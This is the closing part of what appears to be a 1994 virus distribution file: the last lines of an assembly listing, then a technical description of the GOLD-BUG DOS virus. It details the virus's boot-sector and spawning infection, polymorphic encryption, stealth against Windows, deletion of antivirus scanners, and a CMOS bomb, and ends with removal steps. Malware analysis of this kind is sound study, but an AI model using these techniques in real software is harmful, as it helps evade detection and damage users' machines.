
gold_bug        endp
cseg            ends
end             com_code

;-----------------------------------------------------------------------------

Virus Name:  GOLD-BUG
Aliases:     AU, GOLD, GOLD-FEVER, GOLD-MINE
V Status:    New, Research
Discovery:   January, 1994
Symptoms:    CMOS checksum failure; Creates files with no extension; Modem
	     answers on 7th ring; BSC but it is hidden; Most virus scanners
	     fail to run or are Deleted; CHKLIST.??? files deleted.
Origin:      USA
Eff Length:  1,024 Bytes
Type Code:   SBERaRbReX - Spawning Color Video Resident and Extended HMA
	     Memory Resident Boot-Sector and Master-Sector Infector
Detection Method:  None
Removal Instructions:  See Below

General Comments:

	GOLD-BUG is a memory-resident multipartite polymorphic stealthing
	boot-sector spawning anti-antivirus virus that works with DOS 5 and
	DOS 6 in the HIMEM.SYS memory.  When an .EXE program infected with the
	GOLD-BUG virus is run, it determines if it is running on an 80186 or
	better, if not it will terminate and not install.  If it is on an
	80186 or better it will copy itself to the partition table of the hard
	disk and remain resident in memory in the HMA (High Memory Area) only
	if the HMA is available, ie. DOS=HIGH in the CONFIG.SYS file else no
	infection will occur.  The old partition table is moved to sector 14
	and the remainder of the virus code is copied to sector 13.  The virus
	then executes the spawned associated file if present.  INT 13 and
	INT 2F are hooked into at this time but not INT 21.  The spawning
	feature of this virus is not active now.

	When the computer is rebooted, the virus goes memory resident in the
	color video memory.  Also at this time the GOLD-BUG virus removes
	itself from the partition table and restores the old one back.  Unlike
	other boot-sector infectors, it does not use the top of memory to
	store the code.  CHKDSK does not show a decrease in available memory.
	At this time it only hooks INT 10 and monitors when the HMA becomes
	available.  Once DOS moves into the HMA, then GOLD-BUG moves into the
	HMA at address FFFF:FB00 to FFFF:FFFF.  If the HMA never becomes
	available, ie. DOS loaded LOW or the F5 key hit in DOS 6 to bypass the
	CONFIG.SYS, then the virus clears itself from the system memory when
	the computer changes into graphics mode.  If it moves to the HMA, it
	hooks INT 13, INT 21 and INT 2F and then rewrites itself back to the
	partition table.  The GOLD-BUG virus also has some code that stays
	resident in the interrupt vector table to always make the HMA
	available to the virus.  The full features of the virus are now
	active.

	The GOLD-BUG virus will infect the boot sector of 1.2M diskettes.
	The virus copies itself to the boot sector of the diskette and moves
	a copy of the boot sector to sector 28 and the remainder of the code
	is copied to sector 27.  These are the last 2 sectors of the 1.2M disk
	root directory.  If there are file entries on sector 27 or 28 it will
	not overwrite them with the virus code.  It will infect 1.2M disks in
	drive A: or B:  If a clean boot disk is booted from drive A: and you
	try to access C: you will get an invalid drive specification.

	The boot-sector infection is somewhat unique.  If the computer is
	booted with a disk that contains the GOLD-BUG virus, it will remain in
	video memory until the HMA is available and then infect the hard disk.
	Also at this time, it will remove itself from the 1.2M disk.  The
	virus will never infect this disk again.  It makes tracking where you
	got the virus from difficult in that your original infected disk is
	not infected anymore.

	If an .EXE file less than 64K and greater then 1.5K is executed,
	GOLD-BUG will randomly decide to spawn a copy of it.  The .EXE file is
	renamed to the same file name with no extension, ie. CHKDSK.EXE
	becomes CHKDSK.  The original file attributes are then changed to
	SYSTEM.  An .EXE file with the same name is created.  This .EXE file
	has the same length, file date and attributes as the original .EXE
	file.  This spawning process will not make a copy on a diskette
	because it might be write protected and be detected; but it will make
	a spawn .EXE file on a network drive.  When a spawned file is created,
	CHKLIST.??? of the current directory is also deleted.  The .EXE file
	that is created is actually a .COM file; it has no .EXE header.

	The GOLD-BUG virus is very specific as to what type of .EXE files it
	will spawn copies.  It will not spawn any Windows .EXE files or any
	other .EXE files the use the new extended .EXE header except those
	that use the PKLITE extended .EXE header.  This way all Windows
	programs will continue to run and the virus will still be undetected.

	The GOLD-BUG virus is also Polymorphic.  Each .EXE file it creates
	only has 2 bytes that remain constant.  It can mutate into 128
	different decryption patterns.  It uses a double decryption technique
	that involves INT 3 that makes it very difficult to decrypt using a
	debugger.  The assembly code allowed for 512 different front-end
	decrypters.  Each of these can mutate 128 different ways.

	The GOLD-BUG virus incorporates an extensive steathing technique.  Any
	time the hard disk partition table or boot sector of an infected
	diskette is examined, the copy of the partition table or boot sector
	is returned.  If a spawned .EXE file is opened to be read or executed;
	the GOLD-BUG virus will redirect to the original file.  Windows 3.1
	will detect a resident boot-sector virus if the "Use 32 Bit Access" is
	enabled on the "Virtual Memory" option.  GOLD-BUG will disconnect
	itself from the INT 13 chain when Windows installs and reconnect when
	Windows uninstalles to avoid being detected.  When Windows starts, the
	GOLD-BUG virus will copy the original hard disk partition table back.
	When Windows ends, the GOLD-BUG virus will reinfect the partition
	table.

	The GOLD-BUG virus also has an extensive anti-antivirus routine.  It
	can install itself with programs like VSAFE.COM and DISKMON.EXE
	resident that monitor changes to the computer that are common for
	viruses.  It writes to the disk using the original BIOS INT 13 and not
	the INT 13 chain that these types of programs have hooked into.  It
	hooks into the bottom of the interrupt chain rather than changing and
	hooking interrupts; very similar to the tunneling technique.  If the
	GOLD-BUG virus is resident in memory, any attempts to run most virus
	scanners will be aborted.  GOLD-BUG stops any large .EXE file
	(greater than 64k) with the last two letters of "AN" to "AZ".  It will
	stop SCAN.EXE, CLEAN.EXE, NETSCAN.EXE, CPAV.EXE, MSAV.EXE, TNTAV.EXE,
	etc., etc.  The SCAN program will either be deleted or an execution
	error will return.  Also, GOLD-BUG will cause a CMOS checksum failure
	to happen next time the system boots.  GOLD-BUG also erases
	"CHKLIST.???" created by CPAV.EXE and MSAV.EXE.  Programs that do an
	internal checksum on themselves will not detect any changes.  The
	Thunder Byte Antivirus programs contain a partition table program that
	claims it can detect all partition table viruses.  GOLD-BUG rides
	right through the ThunderByte partition virus checker.

	The GOLD-BUG virus detects a modem.  If you received an incoming call
	on the modem line, GOLD-BUG will output a string that will set the
	modem to answer on the seventh ring.

	If a program tries to erase the infected .EXE file, the original
	program and not the infected .EXE file is erased.

	The text strings "AU", "1O7=0SLMTA", and "CHKLIST????" appear in the
	decrypted code.  The virus gets it name from "AU", the chemical
	element "GOLD".  The text string "CHKLIST????" is actually executable
	code.

	The GOLD-BUG virus has two companion viruses that it works with.  The
	DA'BOYS virus is also a boot-sector infector.  It is possible to have
	a diskette with two boot-sector viruses.  GOLD-BUG hides the presence
	of the DA'BOYS virus from the Windows 3.1 startup routine.  GOLD-BUG
	removes the DA'BOYS virus from the INT 13 chain at the start of
	Windows and restores it when Windows ends.  The GOLD-BUG virus works
	with the XYZ virus; it reserves the space FFFF:F900 to FFFF:FAFF in
	the HMA for the XYZ virus so it can load as well.

	To remove the GOLD-BUG virus, change DOS=HIGH to DOS=LOW in the
	CONFIG.SYS, then reboot.  Once the system comes up again, reboot from
	a clean boot disk.  The Virus has now removed itself from the
	partition table and memory.  With the ATTRIB command check for files
	with the SYSTEM bit set that don't have any extension.  Delete the
	.EXE file associated with the SYSTEM file.  Using ATTRIB remove the
	SYSTEM attribute.  Rename the file with no extension to an .EXE file.
	Format each diskette or run SYS to remove the virus from the boot
	sector of each 1.2M disk.  Any spawned .EXE files copied to diskette
	need to be deleted.

	Several variations of this virus can exist.  The assembly code allowed
	for 14 features to be turned on or off:  Delete Scanners, Check for
	8088, Infect at Random, Deflect Delete, CMOS Bomb, File Reading
	Stealth, Same File Date, Double Decryption, Execute Spawned, Modem
	Code, Anti-Antivirus, Polymorphic, Multipartite and 720K or 1.2M
	Diskette Infection.  Some of these features can be disabled and more
	code added to change the characteristics of this virus.
